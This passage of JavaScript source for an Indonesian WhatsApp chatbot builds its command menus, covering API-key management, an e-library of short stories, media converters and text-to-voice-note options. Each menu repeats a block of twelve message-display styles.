                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break   
case 'pm2menu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *E G G V I P - M E N U*
${simboltengah}
${global.tTeks}addip *ip/link*
${global.tTeks}deleteip *ip*
${global.tTeks}listip
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'apimenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *A P I - M E N U*
${simboltengah}
${global.tTeks}apilol
${global.tTeks}apilolsc *apikey*
${global.tTeks}apineocek
${global.tTeks}apineosearch *apikey*
${global.tTeks}apiprem *username*
${global.tTeks}capi
${global.tTeks}cekapikey *apikey*
${global.tTeks}delapi *username*
${global.tTeks}delusrapi *username*
${global.tTeks}resetlimit
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break 
case 'e-perpusmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *E - P E R P U S - M E N U*
${simboltengah}
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴀɴᴀᴋ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʙᴜᴅᴀʏᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ɢᴀʟᴀᴜ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ɢᴏᴋɪʟ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ɪɴꜱᴘɪʀᴀᴛɪꜰ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴊᴀᴡᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴊᴇᴘᴀɴɢ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴋᴇʜɪᴅᴜᴘᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴋᴇʟᴜᴀʀɢᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴋᴏʀᴇᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴋʀɪꜱᴛᴇɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʟɪʙᴜʀᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʟɪɴɢᴋᴜɴɢᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴍᴀʟᴀʏꜱɪᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴍᴇɴɢʜᴀʀᴜᴋᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴍɪꜱᴛᴇʀɪ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴍᴏᴛɪᴠᴀꜱɪ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ɴᴀꜱɪʜᴀᴛ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ɴᴀꜱɪᴏɴᴀʟɪꜱᴍᴇ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴏʟᴀʜʀᴀɢᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇɴᴀɴᴛɪᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇɴᴅɪᴅɪᴋᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴏʀʙᴀɴᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇɴʏᴇꜱᴀʟᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇʀᴊᴜᴀɴɢᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇʀᴘɪꜱᴀʜᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇʀꜱᴀʜᴀʙᴀᴛᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇᴛᴜᴀʟᴀɴɢᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀᴀᴍᴀᴅʜᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀᴇᴍᴀᴊᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀᴇɴᴜɴɢᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀɪɴᴅᴜ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀᴏʜᴀɴɪ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀᴏᴍᴀɴᴛɪꜱ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ꜱᴀꜱᴛʀᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ꜱᴇᴅɪʜ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ꜱᴇᴊᴀʀᴀʜ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ꜱᴜɴᴅᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴛᴇʀᴊᴇᴍᴀʜᴀɴ 
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'convertmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *C O N V E R T - M E N U*
${simboltengah}
${global.tTeks}ardi *text*
${global.tTeks}aoi *text*
${global.tTeks}dimas *text*
${global.tTeks}daichi *text*
${global.tTeks}filetourl *reply File*
${global.tTeks}gadis *text*
${global.tTeks}jajang *text*
${global.tTeks}janie *text*
${global.tTeks}mayu *text*
${global.tTeks}naoki *text*
${global.tTeks}shiori *text*
${global.tTeks}siti *text*
${global.tTeks}tuti *text*
${global.tTeks}toaksara *text*
${global.tTeks}tolatin *text*
${global.tTeks}tohuruf *text*
${global.tTeks}toaud *reply audio*
${global.tTeks}togif *reply sticker*
${global.tTeks}toimg *reply sticker*
${global.tTeks}tomp3 *reply vid*
${global.tTeks}tomp4 *reply gif*
${global.tTeks}toptv *reply vid*
${global.tTeks}topdf *reply img*
${global.tTeks}toqr *reply link*
${global.tTeks}tourl *reply img*
${global.tTeks}tourl2 
${global.tTeks}tovid *reply gif*
${global.tTeks}tovideo *reply gif*
${global.tTeks}tovn *reply vid*
${global.tTeks}urltoimg *reply link*
${global.tTeks}upload *reply vid*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'vnmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *V N - M E N U*
${simboltengah}
${global.tTeks}vnindonesia *text*
${global.tTeks}vnjepang *text*
${global.tTeks}vnenglish *text*
${global.tTeks}vnmyanmar *text*
${global.tTeks}vnrusia *text*
${global.tTeks}vnitalia *text*
${global.tTeks}vnjerman *text*
${global.tTeks}vnfranch *text*
${global.tTeks}vnphilipines *text*
${global.tTeks}vnindia *text*
${global.tTeks}vnthailand *text*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
